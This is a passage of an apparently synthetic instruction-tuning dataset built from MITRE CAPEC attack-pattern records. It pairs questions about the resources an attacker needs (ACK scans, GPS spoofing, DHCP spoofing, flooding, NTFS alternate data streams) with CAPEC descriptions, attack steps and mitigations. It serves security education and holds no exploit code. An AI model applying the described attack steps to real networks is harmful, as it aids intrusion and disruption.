        "Mitigations": {
          "Mitigation": [
            "A given code signing scheme may be fallible due to improper use of cryptography. Developers must never roll out their own cryptography, nor should existing primitives be modified or ignored.",
            "If an attacker cannot attack the scheme directly, they might try to alter the environment that affects the signing and verification processes. A possible mitigation is to avoid reliance on flags or environment variables that are user-controllable."
          ]
        },
        "Example_Instances": {
          "Example": [
            "In old versions (prior to 3.0b4) of the Netscape web browser Attackers able to foist a malicious Applet into a client's browser could execute the \"Magic Coat\" attack. In this attack, the offending Applet would implement its own getSigners() method. This implementation would use the containing VM's APIs to acquire other Applet's signatures (by calling _their_ getSigners() method) and if any running Applet had privileged-enough signature, the malicious Applet would have inherited that privilege just be (metaphorically) donning the others' coats.",
            "Some (older) web browsers allowed scripting languages, such as JavaScript, to call signed Java code. In these circumstances, the browser's VM implementation would choose not to conduct stack inspection across language boundaries (from called signed Java to calling JavaScript) and would short-circuit \"true\" at the language boundary. Doing so meant that the VM would allow any (unprivileged) script to call privileged functions within signed code with impunity, causing them to fall prey to luring attacks.",
            "The ability to load unsigned code into the kernel of earlier versions of Vista and bypass integrity checking is an example of such subversion. In the proof-of-concept, it is possible to bypass the signature-checking mechanism Vista uses to load device drivers."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "325"
            },
            {
              "@CWE_ID": "328"
            },
            {
              "@CWE_ID": "1326"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1553.002",
            "Entry_Name": "Subvert Trust Controls: Code Signing"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attacker_Skills_or_Knowledge_Required, Description Summary"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: TCP ACK Scan (CAPEC ID: 305)",
    "context": "",
    "output": "required resources:\nThis attack can be achieved via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "This attack can be achieved via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.",
      "@Name": "TCP ACK Scan (CAPEC ID: 305)",
      "attack_ptrn": {
        "@ID": "305",
        "@Name": "TCP ACK Scan",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary uses TCP ACK segments to gather information about firewall or ACL configuration. The purpose of this type of scan is to discover information about filter configurations rather than port state. This type of scanning is rarely useful alone, but when combined with SYN scanning, gives a more complete picture of the type of firewall rules that are present.",
        "Extended_Description": {
          "xhtml:p": "When a TCP ACK segment is sent to a closed port, or sent out-of-sync to a listening port, the RFC 793 expected behavior is for the device to respond with a RST. Getting RSTs back in response to a ACK scan gives the attacker useful information that can be used to infer the type of firewall present. Stateful firewalls will discard out-of-sync ACK packets, leading to no response. When this occurs the port is marked as filtered. When RSTs are received in response, the ports are marked as unfiltered, as the ACK packets solicited the expected behavior from a port. When combined with SYN techniques an attacker can gain a more complete picture of which types of packets get through to a host and thereby map out its firewall rule-set. ACK scanning, when combined with SYN scanning, also allows the adversary to analyze whether a firewall is stateful or non-stateful (described in notes). TCP ACK Scans are somewhat faster and more stealthy than other types of scans but often requires rather sophisticated analysis by an experienced person. A skilled adversary may use this method to map out firewall rules, but the results of ACK scanning will be less useful to a novice."
        },
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "300"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Experiment",
              "Description": "An adversary sends TCP packets with the ACK flag set and that are not associated with an existing connection to target ports."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "An adversary uses the response from the target to determine the port's state. If a RST packet is received the target port is either closed or the ACK was sent out-of-sync. If no response is received, the target is likely using a stateful firewall."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The adversary requires logical access to the target network. ACK scanning requires the use of raw sockets, and thus cannot be performed from some Windows systems (Windows XP SP 2, for example). On Unix and Linux, raw socket manipulations require root privileges."
        },
        "Resources_Required": {
          "Resource": "This attack can be achieved via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Other"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Bypass Protection Mechanism",
                "Hide Activities"
              ]
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pg. 55-56"
            },
            {
              "@External_Reference_ID": "REF-128"
            },
            {
              "@External_Reference_ID": "REF-34",
              "@Section": "Section 5.7 TCP ACK Scan, pg. 113"
            },
            {
              "@External_Reference_ID": "REF-130"
            }
          ]
        },
        "Notes": {
          "Note": {
            "@Type": "Other",
            "#text": "If a SYN solicits a SYN/ACK or a RST and an ACK solicits a RST, the port is unfiltered by any firewall type. If a SYN solicits a SYN/ACK, but an ACK generates no response, the port is statefully filtered. When a SYN generates neither a SYN/ACK or a RST, but an ACK generates a RST, the port is statefully filtered. When neither SYN nor ACK generates any response, the port is blocked by a specific firewall rule, which can occur via any type of firewall."
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Prerequisites, Description, Description Summary, References, Related_Weaknesses, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Description, Execution_Flow, Notes"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Counterfeit GPS Signals (CAPEC ID: 627), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nAbility to create spoofed GPS signals.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Ability to create spoofed GPS signals.",
      "@Name": "Counterfeit GPS Signals (CAPEC ID: 627)",
      "attack_ptrn": {
        "@ID": "627",
        "@Name": "Counterfeit GPS Signals",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary attempts to deceive a GPS receiver by broadcasting counterfeit GPS signals, structured to resemble a set of normal GPS signals. These spoofed signals may be structured in such a way as to cause the receiver to estimate its position to be somewhere other than where it actually is, or to be located where it is but at a different time, as determined by the adversary.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "148",
            "Exclude_Related": {
              "@Exclude_ID": "513"
            }
          }
        },
        "Prerequisites": {
          "Prerequisite": "The target must be relying on valid GPS signal to perform critical operations."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "The ability to spoof GPS signals is not trival."
          }
        },
        "Resources_Required": {
          "Resource": "Ability to create spoofed GPS signals."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Integrity",
            "Impact": "Modify Data"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2015-11-09"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit, Typical_Severity"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: System Location Discovery (CAPEC ID: 694)",
    "context": "",
    "output": "The resources required to execute System Location Discovery (CAPEC ID: 694) are the following: The adversary requires access to the target's operating system tools to query relevant system information. On windows, registry queries can be conducted with powershell, wmi, or regedit. On Linux or macOS, queries can be performed with through a shell.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The adversary requires access to the target's operating system tools to query relevant system information. On windows, registry queries can be conducted with powershell, wmi, or regedit. On Linux or macOS, queries can be performed with through a shell.",
      "@Name": "System Location Discovery (CAPEC ID: 694)",
      "attack_ptrn": {
        "@ID": "694",
        "@Name": "System Location Discovery",
        "@Abstraction": "Standard",
        "@Status": "Stable",
        "Description": {
          "xhtml:p": [
            "An adversary collects information about the target system in an attempt to identify the system's geographical location.",
            "Information gathered could include keyboard layout, system language, and timezone. This information may benefit an adversary in confirming the desired target and/or tailoring further attacks."
          ]
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "169"
          }
        },
        "Execution_Flow": {
          "Attack_Step": {
            "Step": "1",
            "Phase": "Explore",
            "Description": "[System Locale Information Discovery] The adversary examines system information from various sources such as registry and native API functions and correlates the gathered information to infer the geographical location of the target system",
            "Technique": [
              "Registry Query: Query the registry key HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ContentIndex\\Language\\Language_Dialect on Windows to obtain system language, Computer\\HKEY_CURRENT_USER\\Keyboard Layout\\Preload to obtain the hexadecimal language IDs of the current user's preloaded keyboard layouts, and Computer\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation to obtain the system timezone configuration",
              "Native API Requests: Parse the outputs of Windows API functions GetTimeZoneInformation, GetUserDefaultUILanguage, GetSystemDefaultUILanguage, GetKeyboardLayoutList and GetUserDefaultLangID to obtain information about languages, keyboard layouts, and timezones installed on the system or on macOS or Linux systems, query locale to obtain the $LANG environment variable and view keyboard layout information or use timeanddatectl status to show the system clock settings.",
              "Read Configuration Files: For macOS and Linux-based systems, view the /etc/vconsole.conf file to get information about the keyboard mapping and console font."
            ]
          }
        },
        "Prerequisites": {
          "Prerequisite": "The adversary must have some level of access to the system and have a basic understanding of the operating system in order to query the appropriate sources for relevant information."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "The adversary must know how to query various system sources of information respective of the system's operating system to obtain the relevant information."
          }
        },
        "Resources_Required": {
          "Resource": "The adversary requires access to the target's operating system tools to query relevant system information. On windows, registry queries can be conducted with powershell, wmi, or regedit. On Linux or macOS, queries can be performed with through a shell."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Read Data"
          }
        },
        "Mitigations": {
          "Mitigation": "To reduce the amount of information gathered, one could disable various geolocation features of the operating system not required for system operation."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "497"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1614",
            "Entry_Name": "System Language Discovery"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-727"
            },
            {
              "@External_Reference_ID": "REF-728"
            },
            {
              "@External_Reference_ID": "REF-729"
            },
            {
              "@External_Reference_ID": "REF-730"
            },
            {
              "@External_Reference_ID": "REF-731"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2022-09-29"
          }
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Flooding (CAPEC ID: 125), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nA script or program capable of generating more requests than the target can handle, or a network or cluster of objects all capable of making simultaneous requests.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A script or program capable of generating more requests than the target can handle, or a network or cluster of objects all capable of making simultaneous requests.",
      "@Name": "Flooding (CAPEC ID: 125)",
      "attack_ptrn": {
        "@ID": "125",
        "@Name": "Flooding",
        "@Abstraction": "Meta",
        "@Status": "Stable",
        "Description": "An adversary consumes the resources of a target by rapidly engaging in a large number of interactions with the target. This type of attack generally exposes a weakness in rate limiting or flow. When successful this attack prevents legitimate users from accessing the service and can cause the target to crash. This attack differs from resource depletion through leaks or allocations in that the latter attacks do not rely on the volume of requests made to the target but instead focus on manipulation of the target's operations. The key factor in a flooding attack is the number of requests the adversary can make in a given period of time. The greater this number, the more likely an attack is to succeed against a given target.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Medium",
        "Prerequisites": {
          "Prerequisite": "Any target that services requests is vulnerable to this attack on some level of scale."
        },
        "Resources_Required": {
          "Resource": "A script or program capable of generating more requests than the target can handle, or a network or cluster of objects all capable of making simultaneous requests."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Availability",
            "Impact": [
              "Unreliable Execution",
              "Resource Consumption"
            ],
            "Note": "A successful flooding attack compromises the availability of the target system's service by exhausting its available resources."
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Ensure that protocols have specific limits of scale configured.",
            "Specify expectations for capabilities and dictate which behaviors are acceptable when resource allocation reaches limits.",
            "Uniformly throttle all requests in order to make it more difficult to consume resources more quickly than they can again be freed."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "404"
            },
            {
              "@CWE_ID": "770"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1498.001",
              "Entry_Name": "Network Denial of Service: Direct Network Flood"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1499",
              "Entry_Name": "Endpoint Denial of Service"
            },
            {
              "@Taxonomy_Name": "WASC",
              "Entry_ID": "10",
              "Entry_Name": "Denial of Service"
            },
            {
              "@Taxonomy_Name": "OWASP Attacks",
              "Entry_Name": "Traffic flood"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Activation_Zone, Attack_Motivation-Consequences, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: ICMP Address Mask Request (CAPEC ID: 294), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nThe ability to send custom ICMP queries. This can be accomplished via the use of various scanners or utilities.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The ability to send custom ICMP queries. This can be accomplished via the use of various scanners or utilities.",
      "@Name": "ICMP Address Mask Request (CAPEC ID: 294)",
      "attack_ptrn": {
        "@ID": "294",
        "@Name": "ICMP Address Mask Request",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary sends an ICMP Type 17 Address Mask Request to gather information about a target's networking configuration. ICMP Address Mask Requests are defined by RFC-950, \"Internet Standard Subnetting Procedure.\" An Address Mask Request is an ICMP type 17 message that triggers a remote system to respond with a list of its related subnets, as well as its default gateway and broadcast address via an ICMP type 18 Address Mask Reply datagram. Gathering this type of information helps the adversary plan router-based attacks as well as denial-of-service attacks against the broadcast address.",
        "Extended_Description": {
          "xhtml:p": "Many modern operating systems will not respond to ICMP type 17 messages for security reasons. Determining whether a system or router will respond to an ICMP Address Mask Request helps the adversary determine operating system or firmware version. Additionally, because these types of messages are rare, they are easily spotted by intrusion detection systems. Many ICMP scanning tools support IP spoofing to help conceal the origin of the actual request among a storm of similar ICMP messages. It is a common practice for border firewalls and gateways to be configured to block ingress ICMP type 17 and egress ICMP type 18 messages."
        },
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "292",
            "Exclude_Related": {
              "@Exclude_ID": "512"
            }
          }
        },
        "Prerequisites": {
          "Prerequisite": "The ability to send an ICMP type 17 query (Address Mask Request) to a remote target and receive an ICMP type 18 message (ICMP Address Mask Reply) in response. Generally, modern operating systems will ignore ICMP type 17 messages, however, routers will commonly respond to this request."
        },
        "Resources_Required": {
          "Resource": "The ability to send custom ICMP queries. This can be accomplished via the use of various scanners or utilities."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Other"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Hide Activities"
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pp. 53-54"
            },
            {
              "@External_Reference_ID": "REF-139"
            },
            {
              "@External_Reference_ID": "REF-123"
            },
            {
              "@External_Reference_ID": "REF-125"
            },
            {
              "@External_Reference_ID": "REF-34",
              "@Section": "Section 3.7.2 ICMP Probe Selection, pg. 70"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Description Summary, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: DHCP Spoofing (CAPEC ID: 697)",
    "context": "",
    "output": "required resources:\nThe adversary requires access to a machine within the target LAN on a network which does not secure its DHCP traffic through MAC-Forced Forwarding, port security, etc.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The adversary requires access to a machine within the target LAN on a network which does not secure its DHCP traffic through MAC-Forced Forwarding, port security, etc.",
      "@Name": "DHCP Spoofing (CAPEC ID: 697)",
      "attack_ptrn": {
        "@ID": "697",
        "@Name": "DHCP Spoofing",
        "@Abstraction": "Standard",
        "@Status": "Stable",
        "Description": {
          "xhtml:p": "An adversary masquerades as a legitimate Dynamic Host Configuration Protocol (DHCP) server by spoofing DHCP traffic, with the goal of redirecting network traffic or denying service to DHCP."
        },
        "Extended_Description": {
          "xhtml:p": [
            "DHCP is broadcast to the entire Local Area Network (LAN) and does not have any form of authentication by default. Therefore, it is susceptible to spoofing.",
            "An adversary with access to the target LAN can receive DHCP messages; obtaining the topology information required to potentially manipulate other hosts' network configurations.",
            "To improve the likelihood of the DHCP request being serviced by the Rogue server, an adversary can first starve the DHCP pool."
          ]
        },
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "194"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "158"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "94"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine Exsisting DHCP lease] An adversary observes network traffic and waits for an existing DHCP lease to expire on a target machine in the LAN.",
              "Technique": "Adversary observes LAN traffic for DHCP solicitations"
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Capture the DHCP DISCOVER message] The adversary captures \"DISCOVER\" messages and crafts \"OFFER\" responses for the identified target MAC address. The success of this attack centers on the capturing of and responding to these \"DISCOVER\" messages.",
              "Technique": "Adversary captures and responds to DHCP \"DISCOVER\" messages tailored to the target subnet."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Compromise Network Access and Collect Network Activity] An adversary successfully acts as a rogue DHCP server by redirecting legitimate DHCP requests to itself.",
              "Technique": "Adversary sends repeated DHCP \"REQUEST\" messages to quickly lease all the addresses within network's DHCP pool and forcing new DHCP requests to be handled by the rogue DHCP server."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The adversary must have access to a machine within the target LAN which can send DHCP offers to the target."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "The adversary must identify potential targets for DHCP Spoofing and craft network configurations to obtain the desired results."
          }
        },
        "Resources_Required": {
          "Resource": "The adversary requires access to a machine within the target LAN on a network which does not secure its DHCP traffic through MAC-Forced Forwarding, port security, etc."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control"
              ],
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Integrity",
                "Access Control"
              ],
              "Impact": [
                "Modify Data",
                "Execute Unauthorized Commands"
              ]
            },
            {
              "Scope": "Availability",
              "Impact": "Resource Consumption"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: MAC-Forced Forwarding",
            "Implementation: Port Security and DHCP snooping",
            "Implementation: Network-based Intrusion Detection Systems"
          ]
        },
        "Example_Instances": {
          "Example": "In early 2019, Microsoft patched a critical vulnerability (CVE-2019-0547) in the Windows DHCP client which allowed remote code execution via crafted DHCP OFFER packets. [REF-739]"
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "923"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1557.003",
            "Entry_Name": "Adversary-in-the-Middle: DHCP Spoofing"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-737"
            },
            {
              "@External_Reference_ID": "REF-738"
            },
            {
              "@External_Reference_ID": "REF-739"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2022-09-29"
          }
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: Windows ::DATA Alternate Data Stream (CAPEC ID: 168)",
    "context": "",
    "output": "required resources:\nThe attacker must have command line or programmatic access to the target's files system with write/read permissions.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The attacker must have command line or programmatic access to the target's files system with write/read permissions.",
      "@Name": "Windows ::DATA Alternate Data Stream (CAPEC ID: 168)",
      "attack_ptrn": {
        "@ID": "168",
        "@Name": "Windows ::DATA Alternate Data Stream",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker exploits the functionality of Microsoft NTFS Alternate Data Streams (ADS) to undermine system security. ADS allows multiple \"files\" to be stored in one directory entry referenced as filename:streamname. One or more alternate data streams may be stored in any file or directory. Normal Microsoft utilities do not show the presence of an ADS stream attached to a file. The additional space for the ADS is not recorded in the displayed file size. The additional space for ADS is accounted for in the used space on the volume. An ADS can be any type of file. ADS are copied by standard Microsoft utilities between NTFS volumes. ADS can be used by an attacker or intruder to hide tools, scripts, and data from detection by normal system utilities. Many anti-virus programs do not check for or scan ADS. Windows Vista does have a switch (-R) on the command line DIR command that will display alternate streams.",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "636"
          }
        },
        "Prerequisites": {
          "Prerequisite": "The target must be running the Microsoft NTFS file system."
        },
        "Resources_Required": {
          "Resource": "The attacker must have command line or programmatic access to the target's files system with write/read permissions."
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Use FAT file systems which do not support Alternate Data Streams.",
            "Implementation: Use Vista dir with the -R switch or utility to find Alternate Data Streams and take appropriate action with those discovered.",
            "Implementation: Use products that are Alternate Data Stream aware for virus scanning and system security operations."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "212"
            },
            {
              "@CWE_ID": "69"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "OWASP Attacks",
            "Entry_Name": "Windows alternate data stream"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Related_Attack_Patterns, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: Traceroute Route Enumeration (CAPEC ID: 293)",
    "context": "",
    "output": "required resources:\nA command line version of traceroute or similar tool that performs route enumeration.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A command line version of traceroute or similar tool that performs route enumeration.",
      "@Name": "Traceroute Route Enumeration (CAPEC ID: 293)",
      "attack_ptrn": {
        "@ID": "293",
        "@Name": "Traceroute Route Enumeration",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary uses a traceroute utility to map out the route which data flows through the network in route to a target destination. Tracerouting can allow the adversary to construct a working topology of systems and routers by listing the systems through which data passes through on their way to the targeted machine. This attack can return varied results depending upon the type of traceroute that is performed. Traceroute works by sending packets to a target while incrementing the Time-to-Live field in the packet header. As the packet traverses each hop along its way to the destination, its TTL expires generating an ICMP diagnostic message that identifies where the packet expired. Traditional techniques for tracerouting involved the use of ICMP and UDP, but as more firewalls began to filter ingress ICMP, methods of traceroute using TCP were developed.",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "309"
          }
        },
        "Prerequisites": {
          "Prerequisite": "A network capable of routing the attackers' packets to the destination network."
        },
        "Resources_Required": {
          "Resource": "A command line version of traceroute or similar tool that performs route enumeration."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Other"
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-33",
